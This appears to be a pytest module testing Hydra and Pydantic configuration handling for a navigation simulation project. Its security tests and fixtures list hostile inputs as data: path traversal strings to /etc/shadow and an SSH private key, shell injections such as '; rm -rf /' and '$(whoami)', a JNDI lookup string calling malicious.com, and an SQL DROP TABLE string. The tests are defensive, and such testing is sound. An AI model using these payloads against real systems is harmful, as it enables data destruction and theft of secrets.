"""
Comprehensive configuration utilities testing for the Hydra-based system.

This module provides comprehensive testing for the Hydra configuration management 
system with Pydantic schema validation, environment variable interpolation, and 
hierarchical configuration composition. Testing coverage includes security validation, 
ConfigStore integration, and configuration-driven factory method integration.

The testing architecture replaces deprecated PyYAML utility functions with 
sophisticated Hydra configuration composition testing using pytest-hydra plugin.
"""

import os
import tempfile
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
from typing import Dict, Any, Optional
import yaml
import json
from decimal import Decimal

# Hydra imports with graceful fallback
try:
    import hydra
    from hydra import initialize, compose
    from hydra.core.global_hydra import GlobalHydra
    from hydra.core.config_store import ConfigStore
    from omegaconf import DictConfig, OmegaConf, MISSING
    HYDRA_AVAILABLE = True
except ImportError:
    hydra = None
    initialize = None
    compose = None
    GlobalHydra = None
    ConfigStore = None
    DictConfig = dict
    OmegaConf = None
    MISSING = "???"
    HYDRA_AVAILABLE = False

# pytest-hydra imports with graceful fallback
try:
    import pytest_hydra
    PYTEST_HYDRA_AVAILABLE = True
except ImportError:
    pytest_hydra = None
    PYTEST_HYDRA_AVAILABLE = False

# Import from the new config module structure per Section 0.2.1
from {{cookiecutter.project_slug}}.config import (
    NavigatorConfig,
    SingleAgentConfig,
    MultiAgentConfig,
    VideoPlumeConfig,
    create_navigator_config,
    create_video_plume_config,
    load_config,
    setup_environment,
    validate_environment,
    ConfigurationError,
    HYDRA_AVAILABLE as CONFIG_HYDRA_AVAILABLE,
    DOTENV_AVAILABLE
)

# Factory method imports for configuration-driven testing
from {{cookiecutter.project_slug}}.api.navigation import create_navigator, create_video_plume


# ============================================================================
# PYTEST-HYDRA FIXTURES AND CONFIGURATION COMPOSITION TESTING
# ============================================================================

@pytest.fixture
def hydra_config_path():
    """Provide path to test configuration directory."""
    # Configuration path relative to package structure
    config_path = Path(__file__).parent.parent.parent / "conf"
    return str(config_path)


@pytest.fixture
def temp_config_directory():
    """Create temporary configuration directory with hierarchical structure."""
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        # Create conf/ directory structure
        conf_dir = temp_path / "conf"
        conf_dir.mkdir()
        
        # Create local override directory
        local_dir = conf_dir / "local"
        local_dir.mkdir()
        
        # Base configuration with comprehensive defaults
        base_config = {
            "navigator": {
                "position": [0.0, 0.0],
                "orientation": 0.0,
                "speed": 0.5,
                "max_speed": 1.0,
                "angular_velocity": 0.0
            },
            "video_plume": {
                "video_path": "${oc.env:TEST_VIDEO_PATH,./data/test_video.mp4}",
                "flip": False,
                "grayscale": True,
                "kernel_size": 0,
                "kernel_sigma": 1.0,
                "normalize": True
            },
            "simulation": {
                "max_duration": 300.0,
                "fps": 30,
                "real_time": True
            }
        }
        
        # Environment-specific configuration with overrides
        config_overrides = {
            "defaults": ["base"],
            "navigator": {
                "speed": 0.8,  # Override base speed
                "max_speed": 2.0  # Override base max_speed
            },
            "video_plume": {
                "flip": True,  # Override base flip setting
                "kernel_size": 3  # Add smoothing
            },
            "environment": {
                "type": "${oc.env:ENVIRONMENT_TYPE,testing}",
                "debug": "${oc.env:DEBUG,true}"
            }
        }
        
        # Local development overrides
        local_overrides = {
            "navigator": {
                "max_speed": "${oc.env:LOCAL_MAX_SPEED,3.0}"
            },
            "logging": {
                "level": "${oc.env:LOG_LEVEL,DEBUG}"
            }
        }
        
        # Write configuration files
        with open(conf_dir / "base.yaml", "w") as f:
            yaml.dump(base_config, f)
        
        with open(conf_dir / "config.yaml", "w") as f:
            yaml.dump(config_overrides, f)
            
        with open(local_dir / "development.yaml", "w") as f:
            yaml.dump(local_overrides, f)
        
        yield str(conf_dir)


@pytest.fixture
def hydra_config_fixture():
    """
    Provide isolated Hydra configuration for testing.
    
    Enhanced fixture using pytest-hydra patterns for configuration composition testing.
    """
    if not HYDRA_AVAILABLE:
        pytest.skip("Hydra not available - skipping Hydra configuration tests")
    
    # Ensure clean Hydra state
    if GlobalHydra().is_initialized():
        GlobalHydra.instance().clear()
    
    return None  # Will be populated by individual tests


@pytest.fixture
def mock_environment_variables():
    """Provide controlled environment variables for testing."""
    test_env = {
        "TEST_VIDEO_PATH": "/test/path/video.mp4",
        "ENVIRONMENT_TYPE": "testing",
        "DEBUG": "true",
        "LOCAL_MAX_SPEED": "2.5",
        "LOG_LEVEL": "INFO",
        "NAVIGATOR_MAX_SPEED": "1.5",
        "VIZ_API_KEY": "test_key_123",
        "DB_PASSWORD": "secure_test_password"
    }
    
    with patch.dict(os.environ, test_env):
        yield test_env


@pytest.fixture
def mock_video_file():
    """Create temporary video file for testing."""
    with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as temp_file:
        temp_path = temp_file.name
        # Write minimal file content to satisfy file existence checks
        temp_file.write(b"fake_video_content")
    
    yield temp_path
    
    # Cleanup
    Path(temp_path).unlink(missing_ok=True)


# ============================================================================
# PYDANTIC SCHEMA VALIDATION TESTING
# ============================================================================

class TestNavigatorConfigValidation:
    """Comprehensive Pydantic schema validation for NavigatorConfig."""
    
    def test_single_agent_config_validation(self):
        """Test single agent NavigatorConfig validation with valid parameters."""
        config_data = {
            "position": [10.0, 20.0],
            "orientation": 45.0,
            "speed": 0.8,
            "max_speed": 1.5,
            "angular_velocity": 0.2
        }
        
        config = NavigatorConfig(**config_data)
        
        assert config.position == [10.0, 20.0]
        assert config.orientation == 45.0
        assert config.speed == 0.8
        assert config.max_speed == 1.5
        assert config.angular_velocity == 0.2
    
    def test_multi_agent_config_validation(self):
        """Test multi-agent NavigatorConfig validation with valid parameters."""
        config_data = {
            "positions": [[0.0, 0.0], [1.0, 1.0], [2.0, 2.0]],
            "orientations": [0.0, 90.0, 180.0],
            "speeds": [0.5, 0.7, 0.9],
            "max_speeds": [1.0, 1.2, 1.4],
            "angular_velocities": [0.1, 0.2, 0.3],
            "num_agents": 3
        }
        
        config = NavigatorConfig(**config_data)
        
        assert len(config.positions) == 3
        assert len(config.orientations) == 3
        assert len(config.speeds) == 3
        assert config.num_agents == 3
    
    def test_navigator_config_speed_constraint_validation(self):
        """Test NavigatorConfig validates speed does not exceed max_speed."""
        with pytest.raises(ValueError, match="speed.*cannot exceed.*max_speed"):
            NavigatorConfig(
                position=[0.0, 0.0],
                speed=2.0,
                max_speed=1.0  # speed > max_speed should fail
            )
    
    def test_navigator_config_orientation_normalization(self):
        """Test NavigatorConfig normalizes orientation to [0, 360) range."""
        config = NavigatorConfig(
            position=[0.0, 0.0],
            orientation=450.0  # Should normalize to 90.0
        )
        
        assert config.orientation == 90.0
    
    def test_navigator_config_multi_agent_consistency_validation(self):
        """Test NavigatorConfig validates multi-agent parameter list consistency."""
        with pytest.raises(ValueError, match="length.*does not match.*number of agents"):
            NavigatorConfig(
                positions=[[0.0, 0.0], [1.0, 1.0]],  # 2 agents
                orientations=[0.0, 90.0, 180.0],     # 3 orientations - mismatch
                num_agents=2
            )
    
    def test_navigator_config_single_multi_exclusivity(self):
        """Test NavigatorConfig prevents mixing single and multi-agent parameters."""
        with pytest.raises(ValueError, match="Cannot specify both single-agent.*and multi-agent"):
            NavigatorConfig(
                position=[0.0, 0.0],  # Single agent parameter
                positions=[[1.0, 1.0], [2.0, 2.0]],  # Multi-agent parameter
                num_agents=2
            )


class TestVideoPlumeConfigValidation:
    """Comprehensive Pydantic schema validation for VideoPlumeConfig."""
    
    def test_video_plume_config_basic_validation(self, mock_video_file):
        """Test basic VideoPlumeConfig validation with valid parameters."""
        config_data = {
            "video_path": mock_video_file,
            "flip": True,
            "grayscale": False,
            "kernel_size": 5,
            "kernel_sigma": 1.5,
            "threshold": 0.3,
            "normalize": True
        }
        
        config = VideoPlumeConfig(**config_data)
        
        assert str(config.video_path) == mock_video_file
        assert config.flip is True
        assert config.grayscale is False
        assert config.kernel_size == 5
        assert config.kernel_sigma == 1.5
        assert config.threshold == 0.3
        assert config.normalize is True
    
    def test_video_plume_config_kernel_validation(self):
        """Test VideoPlumeConfig validates kernel_size must be odd and positive."""
        with pytest.raises(ValueError, match="kernel_size must be odd"):
            VideoPlumeConfig(
                video_path="test.mp4",
                kernel_size=4,  # Even number should fail
                kernel_sigma=1.0,
                _skip_validation=True  # Skip file existence check
            )
        
        with pytest.raises(ValueError, match="kernel_size must be positive"):
            VideoPlumeConfig(
                video_path="test.mp4",
                kernel_size=-1,  # Negative should fail
                kernel_sigma=1.0,
                _skip_validation=True
            )
    
    def test_video_plume_config_gaussian_parameter_consistency(self):
        """Test VideoPlumeConfig validates Gaussian parameter consistency."""
        with pytest.raises(ValueError, match="kernel_sigma must be specified when kernel_size"):
            VideoPlumeConfig(
                video_path="test.mp4",
                kernel_size=5,
                kernel_sigma=None,  # Missing sigma when size specified
                _skip_validation=True
            )
        
        with pytest.raises(ValueError, match="kernel_size must be specified when kernel_sigma"):
            VideoPlumeConfig(
                video_path="test.mp4",
                kernel_size=None,  # Missing size when sigma specified
                kernel_sigma=1.0,
                _skip_validation=True
            )
    
    def test_video_plume_config_threshold_range_validation(self):
        """Test VideoPlumeConfig validates threshold is in [0, 1] range."""
        with pytest.raises(ValueError, match="ensure this value is less than or equal to 1"):
            VideoPlumeConfig(
                video_path="test.mp4",
                threshold=1.5,  # > 1.0 should fail
                _skip_validation=True
            )
        
        with pytest.raises(ValueError, match="ensure this value is greater than or equal to 0"):
            VideoPlumeConfig(
                video_path="test.mp4",
                threshold=-0.1,  # < 0.0 should fail
                _skip_validation=True
            )


class TestSingleAgentConfigValidation:
    """Focused testing for SingleAgentConfig schema."""
    
    def test_single_agent_config_basic_validation(self):
        """Test basic SingleAgentConfig validation."""
        config = SingleAgentConfig(
            position=[5.0, 10.0],
            orientation=30.0,
            speed=0.6,
            max_speed=1.2,
            angular_velocity=0.15
        )
        
        assert config.position == [5.0, 10.0]
        assert config.orientation == 30.0
        assert config.speed == 0.6
        assert config.max_speed == 1.2
        assert config.angular_velocity == 0.15
    
    def test_single_agent_config_defaults(self):
        """Test SingleAgentConfig applies correct defaults."""
        config = SingleAgentConfig()
        
        assert config.position is None
        assert config.orientation == 0.0
        assert config.speed == 0.0
        assert config.max_speed == 1.0
        assert config.angular_velocity == 0.0


class TestMultiAgentConfigValidation:
    """Focused testing for MultiAgentConfig schema."""
    
    def test_multi_agent_config_basic_validation(self):
        """Test basic MultiAgentConfig validation."""
        config = MultiAgentConfig(
            positions=[[0.0, 0.0], [1.0, 0.0], [0.0, 1.0]],
            orientations=[0.0, 90.0, 180.0],
            speeds=[0.5, 0.6, 0.7],
            max_speeds=[1.0, 1.1, 1.2],
            num_agents=3
        )
        
        assert len(config.positions) == 3
        assert len(config.orientations) == 3
        assert len(config.speeds) == 3
        assert config.num_agents == 3
    
    def test_multi_agent_config_position_structure_validation(self):
        """Test MultiAgentConfig validates position structure."""
        with pytest.raises(ValueError, match="must be a list/tuple of.*coordinates"):
            MultiAgentConfig(
                positions=[[0.0], [1.0, 0.0]],  # First position invalid (only 1 coord)
                num_agents=2
            )


# ============================================================================
# HYDRA CONFIGURATION COMPOSITION TESTING
# ============================================================================

@pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
class TestHydraConfigurationComposition:
    """Comprehensive Hydra configuration composition testing using pytest-hydra patterns."""
    
    def test_basic_hydra_config_loading(self, temp_config_directory):
        """Test basic Hydra configuration loading and composition."""
        GlobalHydra.instance().clear()
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config")
            
            # Verify configuration composition
            assert "navigator" in cfg
            assert "video_plume" in cfg
            assert cfg.navigator.speed == 0.8  # Override from config.yaml
            assert cfg.navigator.max_speed == 2.0  # Override from config.yaml
            assert cfg.video_plume.flip is True  # Override from config.yaml
    
    def test_hierarchical_config_composition(self, temp_config_directory):
        """Test hierarchical configuration composition from base to config."""
        GlobalHydra.instance().clear()
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config")
            
            # Verify base configuration is inherited
            assert cfg.navigator.position == [0.0, 0.0]  # From base.yaml
            assert cfg.navigator.orientation == 0.0  # From base.yaml
            
            # Verify config.yaml overrides
            assert cfg.navigator.speed == 0.8  # Overridden in config.yaml
            assert cfg.navigator.max_speed == 2.0  # Overridden in config.yaml
            
            # Verify additional parameters from config.yaml
            assert "environment" in cfg
    
    def test_command_line_config_overrides(self, temp_config_directory):
        """Test Hydra command-line configuration overrides."""
        GlobalHydra.instance().clear()
        
        overrides = [
            "navigator.speed=1.5",
            "video_plume.kernel_size=7",
            "simulation.fps=60"
        ]
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config", overrides=overrides)
            
            # Verify overrides are applied
            assert cfg.navigator.speed == 1.5
            assert cfg.video_plume.kernel_size == 7
            assert cfg.simulation.fps == 60
    
    def test_nested_config_override_validation(self, temp_config_directory):
        """Test nested configuration override validation."""
        GlobalHydra.instance().clear()
        
        complex_overrides = [
            "navigator.position=[10.0,20.0]",
            "video_plume.preprocessing.enhance_contrast=true",
            "simulation.recording.save_trajectories=false"
        ]
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config", overrides=complex_overrides)
            
            # Verify nested overrides
            assert cfg.navigator.position == [10.0, 20.0]
            # Note: Other nested configs would be validated if structure exists
    
    def test_config_validation_error_handling(self, temp_config_directory):
        """Test Hydra configuration validation error handling."""
        GlobalHydra.instance().clear()
        
        invalid_overrides = [
            "navigator.speed=invalid_value",  # Should cause type error
        ]
        
        with initialize(version_base=None, config_path=temp_config_directory):
            # This should raise an error during composition
            with pytest.raises(Exception):  # Hydra will raise various exception types
                compose(config_name="config", overrides=invalid_overrides)


# ============================================================================
# ENVIRONMENT VARIABLE INTERPOLATION TESTING
# ============================================================================

class TestEnvironmentVariableInterpolation:
    """Test ${oc.env:VAR_NAME} syntax for secure credential management."""
    
    def test_environment_variable_interpolation_basic(self, mock_environment_variables, temp_config_directory):
        """Test basic environment variable interpolation."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        GlobalHydra.instance().clear()
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config")
            
            # Environment variables should be interpolated
            assert cfg.video_plume.video_path == "/test/path/video.mp4"
            assert cfg.environment.type == "testing"
            assert cfg.environment.debug is True
    
    def test_environment_variable_with_defaults(self, temp_config_directory):
        """Test environment variable interpolation with default values."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        GlobalHydra.instance().clear()
        
        # Clear environment variable to test default
        with patch.dict(os.environ, {}, clear=True):
            with initialize(version_base=None, config_path=temp_config_directory):
                cfg = compose(config_name="config")
                
                # Should use default value when environment variable not set
                assert cfg.video_plume.video_path == "./data/test_video.mp4"
    
    def test_environment_variable_security_validation(self, mock_environment_variables, temp_config_directory):
        """Test environment variable interpolation cannot override sensitive parameters."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        GlobalHydra.instance().clear()
        
        # Attempt to override sensitive configuration
        malicious_overrides = [
            "database.password=${oc.env:DB_PASSWORD}",  # Should not expose sensitive data
        ]
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config", overrides=malicious_overrides)
            
            # Verify sensitive data handling
            if hasattr(cfg, 'database') and hasattr(cfg.database, 'password'):
                # If database config exists, verify it's handled securely
                assert cfg.database.password != "secure_test_password"  # Should not expose raw value
    
    def test_missing_environment_variable_handling(self, temp_config_directory):
        """Test handling of missing environment variables."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        GlobalHydra.instance().clear()
        
        # Create config with required environment variable
        config_with_required_env = {
            "required_param": "${oc.env:MISSING_REQUIRED_VAR}"
        }
        
        temp_config_file = Path(temp_config_directory) / "missing_env_test.yaml"
        with open(temp_config_file, "w") as f:
            yaml.dump(config_with_required_env, f)
        
        with initialize(version_base=None, config_path=temp_config_directory):
            # Should raise error for missing required environment variable
            with pytest.raises(Exception):  # Hydra/OmegaConf will raise specific error
                compose(config_name="missing_env_test")


# ============================================================================
# HYDRA CONFIGSTORE INTEGRATION TESTING
# ============================================================================

@pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
class TestHydraConfigStoreIntegration:
    """Test Hydra ConfigStore integration and structured configuration composition."""
    
    def test_config_store_schema_registration(self):
        """Test configuration schemas are properly registered with ConfigStore."""
        cs = ConfigStore.instance()
        
        # Verify schemas are registered (they should be auto-registered on import)
        # Note: Actual verification depends on ConfigStore internal API
        # This test structure validates the registration concept
        assert cs is not None
        
        # Create test configuration using registered schema
        try:
            cs.store(name="test_navigator", node=NavigatorConfig)
            # If no exception, registration works
            assert True
        except Exception as e:
            pytest.fail(f"ConfigStore registration failed: {e}")
    
    def test_structured_config_composition(self, hydra_config_fixture):
        """Test structured configuration composition with registered schemas."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        GlobalHydra.instance().clear()
        cs = ConfigStore.instance()
        
        # Register test configuration
        test_config = {
            "navigator": NavigatorConfig(
                position=[0.0, 0.0],
                speed=1.0,
                max_speed=2.0
            ),
            "video_plume": VideoPlumeConfig(
                video_path="test.mp4",
                flip=False,
                _skip_validation=True
            )
        }
        
        cs.store(name="test_structured", node=test_config)
        
        # Test structured composition (concept validation)
        assert True  # Successful registration indicates working integration
    
    def test_config_group_composition(self):
        """Test configuration group composition through ConfigStore."""
        if not HYDRA_AVAILABLE:
            pytest.skip("Hydra not available")
        
        cs = ConfigStore.instance()
        
        # Test group registration
        try:
            cs.store(group="test_navigator", name="single_agent", node=SingleAgentConfig)
            cs.store(group="test_navigator", name="multi_agent", node=MultiAgentConfig)
            assert True  # Successful group registration
        except Exception as e:
            pytest.fail(f"ConfigStore group registration failed: {e}")
    
    def test_automatic_schema_discovery(self):
        """Test automatic schema discovery within configuration hierarchies."""
        # Verify that schemas are automatically discovered
        # This is validated by the successful import of configuration classes
        
        assert NavigatorConfig is not None
        assert SingleAgentConfig is not None
        assert MultiAgentConfig is not None
        assert VideoPlumeConfig is not None
        
        # Verify Pydantic integration
        assert hasattr(NavigatorConfig, 'model_validate')
        assert hasattr(VideoPlumeConfig, 'model_validate')


# ============================================================================
# CONFIGURATION SECURITY TESTING
# ============================================================================

class TestConfigurationSecurity:
    """Comprehensive security testing for configuration parameter validation."""
    
    def test_configuration_path_traversal_protection(self):
        """Test configuration loading prevents path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for malicious_path in malicious_paths:
            with pytest.raises((ValueError, FileNotFoundError, OSError)):
                # Attempt to load configuration from malicious path
                # This should be rejected by path validation
                VideoPlumeConfig(
                    video_path=malicious_path,
                    _skip_validation=False  # Enable file validation
                )
    
    def test_environment_variable_injection_prevention(self, mock_environment_variables):
        """Test environment variable injection prevention."""
        # Test that malicious environment variables cannot override secure parameters
        malicious_env = {
            "MALICIOUS_OVERRIDE": "; rm -rf /",
            "SCRIPT_INJECTION": "$(whoami)",
            "SQL_INJECTION": "'; DROP TABLE users; --"
        }
        
        with patch.dict(os.environ, malicious_env):
            # Configuration should reject malicious values
            config = NavigatorConfig(
                position=[0.0, 0.0],
                speed=0.5
            )
            
            # Verify configuration integrity
            assert config.position == [0.0, 0.0]
            assert config.speed == 0.5
            
            # No malicious values should be present
            config_dict = config.model_dump()
            for key, value in config_dict.items():
                if isinstance(value, str):
                    assert "; rm -rf /" not in value
                    assert "$(whoami)" not in value
                    assert "DROP TABLE" not in value
    
    def test_configuration_parameter_validation_security(self):
        """Test configuration parameter validation prevents malicious inputs."""
        # Test numerical parameter bounds
        with pytest.raises(ValueError):
            NavigatorConfig(
                position=[0.0, 0.0],
                speed=-999999,  # Malicious negative speed
                max_speed=1.0
            )
        
        # Test array bounds validation
        with pytest.raises(ValueError):
            NavigatorConfig(
                positions=[[float('inf'), float('inf')]] * 10000,  # Resource exhaustion attempt
                num_agents=10000
            )
    
    def test_secure_credential_handling(self, mock_environment_variables):
        """Test secure credential handling in configuration system."""
        if not DOTENV_AVAILABLE:
            pytest.skip("python-dotenv not available")
        
        # Test that credentials are not exposed in configuration dumps
        credentials = {
            "API_KEY": "secret_key_123",
            "DATABASE_PASSWORD": "super_secret_password",
            "PRIVATE_TOKEN": "private_token_456"
        }
        
        with patch.dict(os.environ, credentials):
            # Credentials should not leak into configuration objects
            config = NavigatorConfig(position=[0.0, 0.0])
            config_str = str(config)
            config_dict = config.model_dump()
            
            # Verify no credential exposure
            for credential_value in credentials.values():
                assert credential_value not in config_str
                assert credential_value not in str(config_dict)


# ============================================================================
# CONFIGURATION-DRIVEN FACTORY METHOD INTEGRATION TESTING
# ============================================================================

class TestConfigurationDrivenFactoryMethods:
    """Test configuration-driven factory method integration with create_navigator() and create_video_plume()."""
    
    def test_create_navigator_from_dict_config(self):
        """Test create_navigator_config factory method with dictionary input."""
        config_data = {
            "position": [5.0, 10.0],
            "orientation": 45.0,
            "speed": 0.7,
            "max_speed": 1.3,
            "angular_velocity": 0.1
        }
        
        navigator_config = create_navigator_config(config_data)
        
        assert isinstance(navigator_config, NavigatorConfig)
        assert navigator_config.position == [5.0, 10.0]
        assert navigator_config.orientation == 45.0
        assert navigator_config.speed == 0.7
        assert navigator_config.max_speed == 1.3
        assert navigator_config.angular_velocity == 0.1
    
    @pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
    def test_create_navigator_from_hydra_dict_config(self, temp_config_directory):
        """Test create_navigator_config factory method with Hydra DictConfig input."""
        GlobalHydra.instance().clear()
        
        with initialize(version_base=None, config_path=temp_config_directory):
            cfg = compose(config_name="config")
            
            navigator_config = create_navigator_config(cfg.navigator)
            
            assert isinstance(navigator_config, NavigatorConfig)
            assert navigator_config.speed == 0.8  # From config override
            assert navigator_config.max_speed == 2.0  # From config override
    
    def test_create_video_plume_config_factory_method(self, mock_video_file):
        """Test create_video_plume_config factory method."""
        config_data = {
            "video_path": mock_video_file,
            "flip": True,
            "grayscale": False,
            "kernel_size": 5,
            "kernel_sigma": 1.5,
            "normalize": True
        }
        
        video_config = create_video_plume_config(config_data)
        
        assert isinstance(video_config, VideoPlumeConfig)
        assert str(video_config.video_path) == mock_video_file
        assert video_config.flip is True
        assert video_config.grayscale is False
        assert video_config.kernel_size == 5
        assert video_config.kernel_sigma == 1.5
    
    def test_factory_method_validation_error_handling(self):
        """Test factory method error handling for invalid configurations."""
        invalid_config_data = {
            "position": "invalid_position",  # Should be list of floats
            "speed": "invalid_speed",        # Should be numeric
            "max_speed": -1.0               # Should be positive
        }
        
        with pytest.raises(ConfigurationError):
            create_navigator_config(invalid_config_data)
    
    def test_factory_method_comprehensive_validation(self):
        """Test factory methods provide comprehensive validation context."""
        # Test multi-agent configuration validation
        invalid_multi_config = {
            "positions": [[0.0, 0.0], [1.0, 1.0]],  # 2 agents
            "orientations": [0.0, 90.0, 180.0],      # 3 orientations - mismatch
            "num_agents": 2
        }
        
        with pytest.raises(ConfigurationError) as exc_info:
            create_navigator_config(invalid_multi_config)
        
        # Verify error provides helpful context
        assert "validation failed" in str(exc_info.value).lower()
        assert hasattr(exc_info.value, 'context')
        assert hasattr(exc_info.value, 'suggestions')


# ============================================================================
# ENHANCED PYTEST FIXTURES FOR COMPREHENSIVE TESTING
# ============================================================================

@pytest.fixture
def comprehensive_config_scenarios():
    """Provide comprehensive configuration scenarios for testing."""
    return {
        "single_agent_minimal": {
            "navigator": {
                "position": [0.0, 0.0],
                "speed": 0.5,
                "max_speed": 1.0
            }
        },
        "single_agent_complete": {
            "navigator": {
                "position": [10.0, 20.0],
                "orientation": 45.0,
                "speed": 0.8,
                "max_speed": 1.5,
                "angular_velocity": 0.2
            }
        },
        "multi_agent_basic": {
            "navigator": {
                "positions": [[0.0, 0.0], [1.0, 0.0], [0.0, 1.0]],
                "orientations": [0.0, 90.0, 180.0],
                "speeds": [0.5, 0.6, 0.7],
                "max_speeds": [1.0, 1.1, 1.2],
                "num_agents": 3
            }
        },
        "video_plume_basic": {
            "video_plume": {
                "video_path": "test.mp4",
                "flip": False,
                "grayscale": True,
                "_skip_validation": True
            }
        },
        "video_plume_advanced": {
            "video_plume": {
                "video_path": "test_advanced.mp4",
                "flip": True,
                "grayscale": False,
                "kernel_size": 7,
                "kernel_sigma": 2.0,
                "threshold": 0.4,
                "normalize": True,
                "_skip_validation": True
            }
        }
    }


@pytest.fixture
def security_test_scenarios():
    """Provide security test scenarios for configuration validation."""
    return {
        "path_traversal_attempts": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "../../../../root/.ssh/id_rsa"
        ],
        "injection_attempts": [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "${jndi:ldap://malicious.com/a}",
            "''; DROP TABLE users; --"
        ],
        "resource_exhaustion": [
            [float('inf')] * 100000,
            [999999999.0] * 50000,
            "A" * 1000000
        ]
    }


# ============================================================================
# INTEGRATION TESTS WITH CONFIGURATION COMPOSITION
# ============================================================================

class TestConfigurationIntegration:
    """Integration tests for configuration composition across system components."""
    
    @pytest.mark.skipif(not HYDRA_AVAILABLE, reason="Hydra not available")
    def test_end_to_end_config_composition_workflow(self, temp_config_directory, mock_environment_variables):
        """Test complete configuration composition workflow."""
        GlobalHydra.instance().clear()
        
        with initialize(version_base=None, config_path=temp_config_directory):
            # Load base configuration
            cfg = compose(config_name="config")
            
            # Create navigator configuration
            navigator_config = create_navigator_config(cfg.navigator)
            assert isinstance(navigator_config, NavigatorConfig)
            
            # Create video plume configuration
            if hasattr(cfg, 'video_plume'):
                # Update video path for testing
                video_config_data = OmegaConf.to_container(cfg.video_plume, resolve=True)
                video_config_data['_skip_validation'] = True  # Skip file validation for testing
                
                video_config = create_video_plume_config(video_config_data)
                assert isinstance(video_config, VideoPlumeConfig)
    
    def test_configuration_override_composition(self, comprehensive_config_scenarios):
        """Test configuration override and composition scenarios."""
        scenarios = comprehensive_config_scenarios
        
        # Test single agent configuration
        single_config = create_navigator_config(scenarios["single_agent_complete"]["navigator"])
        assert single_config.position == [10.0, 20.0]
        assert single_config.orientation == 45.0
        
        # Test multi-agent configuration
        multi_config = create_navigator_config(scenarios["multi_agent_basic"]["navigator"])
        assert multi_config.num_agents == 3
        assert len(multi_config.positions) == 3
    
    def test_configuration_schema_evolution_compatibility(self):
        """Test configuration schema evolution and backward compatibility."""
        # Test that older configuration formats are handled gracefully
        legacy_config = {
            "position": [0.0, 0.0],
            "orientation": 0.0,
            "speed": 0.5
            # Missing max_speed - should use default
        }
        
        config = create_navigator_config(legacy_config)
        assert config.max_speed == 1.0  # Default value
        assert config.position == [0.0, 0.0]
        assert config.speed == 0.5